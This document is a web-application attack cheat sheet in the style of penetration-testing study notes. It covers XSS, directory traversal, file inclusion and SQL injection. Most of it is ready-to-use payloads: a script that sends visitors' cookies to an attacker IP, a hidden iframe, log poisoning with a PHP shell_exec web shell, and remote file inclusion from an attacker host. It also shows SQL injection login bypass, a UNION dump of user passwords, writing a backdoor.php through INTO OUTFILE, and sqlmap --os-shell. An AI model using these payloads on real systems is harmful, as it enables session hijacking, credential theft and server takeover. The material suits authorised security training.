# Web application attacks

Web applications often contain vulnerabilities due to a large attack surface reliant on multiple technologies, dependencies and configuration challenges.  

### Admin Consoles

Attempt to login with known common username/password pairs and check Google for default credentials \(for commercial products such as Content Management Systems\).  Brute force is an option but shouldn't be our first choice.  Brute forcing often results in undesired consequences, such as IP banning/lockout or detection.

### Cross site scripting

Well-designed web pages typically sanitize user inputs to remove dangerous characters or strings.  Cross site scripting occurs when data is not sanitized and attackers are able to inject inputs that are subsequently displayed on the web page.

There are three variants of cross-site scripting:

* Stored - occurs when the injected payload is stored on the server.  The payload is subsequently displayed to anyone who visits the page.
* Reflected - occurs when injected payloads are placed into the page content through a form or link.  Reflected XSS only affects the person performing the action.
* DOM-Based - take place solely in a page's Document Object Model \(DOM\).

All three variants can result in session hijacking, redirects and script execution.

#### Detecting

Detection is accomplished through reviewing web pages for input fields and testing to determine if those fields accept unsanitized inputs. Commonly sanitized characters \(useful for testing\) include:

```text
< > ' " { } ;
```

To test we include some of these characters in our input, and view the server responses to determine if they were filtered.  Next, we can attempt a basic XSS payload.

```text
<script>alert('XSS')</script>
```

If successful, we should see a popup displayed when we refresh the page.

#### **iFrame injection and redirection**

A more malicious version of this attacks includes injecting invisible iframes into a victims browser.  

```text
<iframe SRC=”http://10.11.0.5/report” height= “0” width= “0”></iframe>
```

When the victim visits the infected page, their browser attempts to download the linked item and establishes a connection with the attacking machine \(requires a netcat listener on port 80\)

#### **Stealing cookies and session information**

Cross site scripting can also be used to steal cookies and session information from site visitors. 

```text
<script> new Image().src=”http://10.11.0.5/cool.jpg?output=”+document.cookie; </script>
```

When a victim visits the page, their browser established a connection back to the attacking machine with an authenticated session id \(listener required\)

Once we have the session id, we can set it in our browser using a tool like Cookie-Editor, and browse to the page without providing credentials \(assumed the cookie we captured was for an authenticated user\).

### Directory Traversal

Directory traversal allows attackers to gain access to files that should not be accessible through a web application.  These attacks are _information disclosures_ and occur when attackers are able to manipulate file paths.

#### Detection

Directory traversal vulnerabilities are often identified through the presence of file extensions in URLs.  If identified, we can then use common OS files to test for vulnerabilities.

```text
10.14.2.55/menu.php?file=index.php
```

```text
Linux - /etc/passwd
Windows - c:/boot.ini
Windows - c:/windows/system32/drivers/etc/hosts
```

### File Inclusion

Whereas directory traversal vulnerabilities only disclose information, file inclusion vulnerabilities may enable code execution.  Local file inclusion occurs when files are loaded from the local server, whereas remote file inclusion allows an attacker to included a file from an external source. These vulnerabilities are most commonly seen in php.

#### Detection

File inclusions are identified in the same way as directory traversals.  If we locate URLs that include parameters, we should test for both vulnerabilities.

We can also attempt LFI through URL manipulation

`../../../../../../windows/system32/drivers/etc/hosts`

In PHP versions below 5.3, terminate the request with a null byte "\(%00\)"

#### Contaminating log files

Use netcat to connect to the target machine on port 80, then send the following command:

```text
<?php echo '<pre>' . shell_exec($_GET[‘cmd’]) . '</pre>';?>
```

Although we receive a "Bad Request" in netcat, the command is stored in the server's logs.  Once logged, we can attempt command execution.

```text
http://10.34.5.34/index.php?file=c:/log/file/location.log&cmd=id
```

If successful, the successful id command will be displayed on the web page.

#### Remote File Inclusion

RFIs are less common than LFIs due to typical default server configuration restrictions.

```text
http://10.34.5.34/index.php?file=http://attackerip/evil.txt
```

If successful, we can further exploit this vulnerability to execute a number of malicious options to gain a shell on the target system

### SQL injection

SQL injection is a common vulnerability that enables attackers to inject commands and interact with databases.  While typically exploited for data leakage, SQL vulnerabilities can also lead to server compromise.

#### Detection

The first step is to find input fields on the target site that likely interact with databases, such as login field, search fields, message threads, etc.  We can use a single quote to check for potential vulnerabilities.  Ideally, this will cause an error and we'll receive an indication from the server.  

#### Authentication bypass

In normal operation we expect  a login form to query the database, something like:

```text
select * from users where name = 'admin' and password = 'password123';
```

We can manipulate the input to change how the command is processed by the database:

```text
admin' or 1=1;#
```

Which results in query modification:

```text
select * from users where name = 'admin' or 1=1;#' and password = 'password123';
```

The introduction of the single quote before the password entry removes the remainder of the statement. If  this causes errors, we can also request a fixed number of returns using the LIMIT statement.

```text
select * from users where name = 'admin' or 1=1 LIMIT 1;#
```

To replicate in a web application, we submit the following payload into a username field:

```text
tom' or 1=1 LIMIT 1;#
```

This should result in a authenticated session login.

#### Enumerating Databases

```text
http://10.14.1.23/test.php?id=1' - begin testing with single quote
http://10.14.1.23/test.php?id=1 order by 1 - attempt to sort by first column
```

If this is successful and we receive the name of column, we can continue to increase the number until we receive an error.  This can be performed manually or automated in BurpSuite Repeater.

Next we can extract row information using the UNION statement.

```text
http://10.14.1.23/test.php?id=1 union all select 1, 2, 3, 4
```

Depending on how the information is displayed, we can then modify our input to extract more information.  In the following example we've identified that the column three falls in a logical spot on the page.

```text
http://10.14.1.23/test.php?id=1 union all select 1, 2, @@version
http://10.14.1.23/test.php?id=1 union all select 1, 2, user()
http://10.14.1.23/test.php?id=1 union all select 1, 2, table_name from information_schema.tables
http://10.14.1.23/test.php?id=1 union all select 1, 2, column_name from information_schema.columns where table_name='users'
http://10.14.1.23/test.php?id=1 union all select 1, username, password from users
```

#### Code Execution

In some cases we can use SQL injection to read/write system files and possibly write PHP onto the system for execution.

```text
http://10.14.1.23/test.php?id=1 union all select 1, 2, load_file('C://Windows/System32/drivers/etc/hosts')
```

If this is successful we can attempt to create a malicious file on the server.

```text
http://10.14.1.23/test.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'
```

We may then be able to access the file with a command.

```text
http://10.14.1.23/backdoor.php?cmd=id
```

If this succeeds, we can expand access by installing a full php shell on the server.

#### SQLmap

Tools such as SQLmap simplify the extraction of information from databases. 

```text
sqlmap -u http://10.14.1.23/test.php?id=1 -p "id"
sqlmap -u http://10.14.1.23/test.php?id=1 -p "id" --dbms=mysql --dump
```

SQLmap also has numerous other features including firewall bypass and attempting to gain a shell on the target system.

```text
sqlmap -u http://10.14.1.23/test.php?id=1 -p "id" --dbms=mysql --os-shell
```

